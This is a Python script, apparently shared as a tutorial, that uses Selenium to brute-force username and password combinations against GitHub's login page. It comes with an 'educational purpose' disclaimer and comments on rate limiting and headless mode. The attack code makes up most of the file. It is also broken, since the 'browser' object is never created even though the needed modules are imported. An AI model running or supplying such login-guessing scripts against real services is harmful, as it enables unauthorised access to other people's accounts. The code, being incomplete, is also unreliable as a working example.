"""This only  for educational purpose"""

"""Web automation with Selenium and Python for brute-forcing login combinations."""

# To automate the process of trying multiple username and password combinations, you can create a loop that iterates over the possible combinations. The script will try each combination, and if the login is successful, it will stop the loop and continue with the next steps.


from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time

# List of possible usernames and passwords
usernames = ["username1", "username2", "username3"]  # Add your possible usernames
passwords = ["password1", "password2", "password3"]  # Add your possible passwords


try:
    # Navigate to the GitHub login page
    browser.get("https://github.com/login")

    # Loop over usernames and passwords
    login_successful = False
    for username in usernames:
        if login_successful:  # Stop loop if login is successful
            break
        for password in passwords:
            print(f"Trying username: {username} and password: {password}")
            try:
                # Find the username and password fields
                username_field = browser.find_element(By.ID, "login_field")
                password_field = browser.find_element(By.ID, "password")

                # Clear the fields in case there's leftover data
                username_field.clear()
                password_field.clear()

                # Enter the username and password
                username_field.send_keys(username)
                password_field.send_keys(password)

                # Submit the form
                password_field.submit()

                # Wait for page to load
                time.sleep(3)

                # Check if login was successful (e.g., by looking for a specific element)
                if "Sign out" in browser.page_source:
                    print(f"Login successful with username: {username} and password: {password}")
                    login_successful = True
                    break  # Exit the inner loop

            except Exception as e:
                print(f"An error occurred: {e}")

    if not login_successful:
        print("None of the combinations worked.")

    # Proceed with the next steps after successful login
    if login_successful:
        print("Proceeding to the next step...")

    # Wait for observation (optional)
    time.sleep(5)

finally:
    # Close the browser
    browser.quit()
    
    
    
    
# How It Works

#     Setup:
#         Create lists of possible usernames and passwords.
#         Set up the browser using Selenium.

#     Login Loop:
#         For each combination of username and password, try logging in.
#         Use Selenium to interact with the username and password fields, clear them, input the values, and submit the form.

#     Check Success:
#         After submitting the form, check if the login was successful by looking for a specific element on the page (e.g., "Sign out" in the page source).

#     Stop on Success:
#         If the login is successful, exit the loop and continue to the next step.

#     Error Handling:
#         If an error occurs (e.g., element not found), it logs the issue and moves to the next combination.

# Important Notes

#     Ethical Use:
#         This code is only for automating login attempts for accounts you own or have explicit permission to access. Unauthorized use is unethical and likely illegal.

#     Login Detection:
#         Update the success condition (e.g., "Sign out" in the page source) based on the actual behavior of the website after a successful login.

#     Rate Limiting:
#         Some websites have security measures like CAPTCHA or account lockout for multiple failed login attempts. Use this responsibly.

#     Headless Mode:
#         You can enable headless mode (chrome_options.add_argument("--headless")) if you don’t need to see the browser window.

# This script will automate the process of testing combinations and proceed once the correct credentials are found.
